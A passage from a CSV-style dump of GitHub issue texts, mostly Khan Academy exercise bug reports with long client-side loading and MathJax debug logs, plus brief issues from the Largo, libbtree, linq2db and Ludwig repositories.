not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) startTask... startTask got task division_4 renderExerciseTask division_4 loading and rendering division_4 loadExercise start division_4.html loadExercise got division_4.html loadExercise submod math loadExercise submod graphie loadExercise submod graphie-helpers-arithmetic loadModule mod /khan-exercises/utils/graphie-helpers-arithmetic.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/third_party/MathJax/2.1/MathJax.js?config=KAthJax-9e2776ffe7d2006f16f36d0d55d9464b loadExercise finish division_4.html loaded division_4, now rendering start of makeProblem chose problem type and seed for division_4 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad (graphie-helpers-arithmeticLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie MathJax done typesetting (\LARGE{1}) MathJax done typesetting (\LARGE{6}) MathJax done typesetting (\LARGE{8}) MathJax done typesetting (\LARGE{6}) MathJax done typesetting (\LARGE{2}) MathJax done typesetting (\LARGE{8}) ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) validator created MathJax done typesetting (\text{ R }) loading and rendering division_4 loaded division_4, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (graphie-helpers-arithmeticCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (graphie-helpers-arithmeticCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for division_4 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad (graphie-helpers-arithmeticLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie MathJax done typesetting (\LARGE{2}) MathJax done typesetting (\LARGE{7}) MathJax done typesetting (\LARGE{7}) MathJax done typesetting (\LARGE{5}) MathJax done typesetting (\LARGE{1}) MathJax done typesetting (\LARGE{6}) ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) validator created MathJax done typesetting (\text{ R }) loading and rendering division_4 loaded division_4, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (graphie-helpers-arithmeticCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (graphie-helpers-arithmeticCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for division_4 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad (graphie-helpers-arithmeticLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie MathJax done typesetting (\LARGE{7}) MathJax done typesetting (\LARGE{5}) MathJax done typesetting (\LARGE{8}) MathJax done typesetting (\LARGE{2}) MathJax done typesetting (\LARGE{3}) ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie ran graphie (kpoint not a fn; src undefined) (kvector not a fn; src undefined) (graphie-helpers-arithmetic not a fn; src undefined) validator created MathJax done typesetting (\text{ R }) loading and rendering division_4 loaded division_4, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (graphie-helpers-arithmeticCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (../third_party/raphaelCleanup not a fn; src undefined) (knumberCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (kpointCleanup not a fn; src undefined) (kvectorCleanup not a fn; src undefined) (graphie-helpers-arithmeticCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for division_4 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) running mathLoad ran mathLoad (../third_party/raphaelLoad not a fn; src undefined) (knumberLoad not a fn; src undefined) running graphieLoad ran graphieLoad running kpointLoad ran kpointLoad running kvectorLoad ran kvectorLoad (graphie-helpers-arithmeticLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\text{ R }) MathJax done typesetting (5 \text{ R } 3) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (../third_party/raphael not a fn; src undefined) (knumber not a fn; src undefined) running graphie MathJax done typesetting (\LARGE{6}) MathJax done typesetting (... [truncated] ",False,True,False,khan-exercises/Khan/148613
largo/INN/1362/184910535,"Changes  Move  inside a &lt;0.5 block in inc/updates.php Remove deprecated widget callbacks from  as the widgets it checks for and notifies the reader of are no longer included in Largo, and as such will be automatically removed by WordPress. Comment out tests for  so that we can still test the function without testing any callbacks.  ",False,True,False,largo/INN/1362
libbtree/Kaboomboom3/1/240819905,Currently when the root node is removed and it has no child the tree becomes unusable. ,False,True,False,libbtree/Kaboomboom3/1
libbtree/Kaboomboom3/1/313277395,Solved by #2 ,False,True,False,libbtree/Kaboomboom3/1
linq2db/linq2db/1490/394136801,"After upgrade ling2db to version 2.6 t4 template start generating ""Find"" extension method with number suffix like this ",False,True,False,linq2db/linq2db/1490
ludwig/uber/184/470698609,"Please, read the docs, the faqs and the blogpost that describe Ludwig BEFORE asking questions. The short answers are ""yes, it can generate characters"" adn ""not yet, the transformer is coming in the next update"". ",False,True,False,ludwig/uber/184
khan-exercises/Khan/80851/20004257,"It doesn't specify that Daniel doesn't eat any himself. That means that the answer could be 8 OR 9, and both are choices. dividing_fractions_word_problems.html?seed=156&amp;problem=candy Answer timeline [""8""]  User hash 476603756 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36 MathJax is loaded, ready, queue length 0 start of log loadModule mod /khan-exercises/utils/answer-types.js loadModule mod /khan-exercises/utils/tmpl.js loadModule mod /khan-exercises/utils/tex.js loadModule mod /khan-exercises/utils/jquery.adhesion.js loadModule mod /khan-exercises/utils/calculator.js loadModule mod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadScript loading /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 startTask... startTask got task undefined loadScript loaded /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise start significant_figures_1.html loading and rendering ratio_word_problems loadExercise start ratio_word_problems.html loadExercise got significant_figures_1.html loadExercise submod math loadModule mod /khan-exercises/utils/math.js loadModule mod /khan-exercises/utils/raphael.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish significant_figures_1.html loadExercise got ratio_word_problems.html loadExercise submod math loadExercise submod math-format loadModule mod /khan-exercises/utils/math-format.js loadModule mod /khan-exercises/utils/expressions.js loadExercise submod word-problems loadModule mod /khan-exercises/utils/word-problems.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish ratio_word_problems.html loaded ratio_word_problems, now rendering loadModule mod /khan-exercises/utils/scratchpad.js start of makeProblem chose problem type and seed for ratio_word_problems cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) validator created MathJax done typesetting (10) MathJax done typesetting (5) MathJax done typesetting (20) loading and rendering significant_figures_1 loaded significant_figures_1, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for significant_figures_1 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (132) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) done with runModules decided on answer type number validator created startTask... startTask got task solving_for_the_y-intercept renderExerciseTask solving_for_the_y-intercept loading and rendering solving_for_the_y-intercept loadExercise start solving_for_the_y-intercept.html loadExercise got solving_for_the_y-intercept.html loadExercise submod math loadExercise submod graphie loadModule mod /khan-exercises/utils/graphie.js loadExercise submod math-format loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish solving_for_the_y-intercept.html loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting ((8, -7)) MathJax done typesetting (y = -\dfrac{6}{5} x + b) MathJax done typesetting (y) MathJax done typesetting (b) MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (b =) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (6) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (3/5) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (7/4) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (1\ 3/4) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (0.75) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (6x + 9y = -81) MathJax done typesetting (y) MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large(0,\ ) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a 